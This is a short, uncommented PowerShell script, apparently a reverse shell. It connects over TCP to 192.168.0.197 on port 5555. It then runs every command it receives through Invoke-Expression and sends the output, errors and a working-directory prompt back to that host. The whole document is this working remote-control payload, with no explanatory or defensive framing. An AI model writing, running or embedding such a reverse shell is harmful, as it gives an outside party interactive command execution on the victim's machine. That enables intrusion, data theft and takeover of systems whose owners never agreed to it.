       $ip = '192.168.0.197'
	$p = 5555

            $clnt = New-Object System.Net.Sockets.TCPClient($ip,$p)

        $strm = $clnt.GetStream()
        [byte[]]$bytes = 0..65535|%{0}


        while(($i = $strm.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $enctxt = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $enctxt.GetString($bytes,0, $i)
            $sb = (Invoke-Expression -Command $data 2>&1 | Out-String )
            $sb2  = $sb + 'CMD ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sb2 = $sb2 + $x

            $sendbyte = ([text.encoding]::ASCII).GetBytes($sb2)
            $strm.Write($sendbyte,0,$sendbyte.Length)
            $strm.Flush()  
        }
        $clnt.Close()
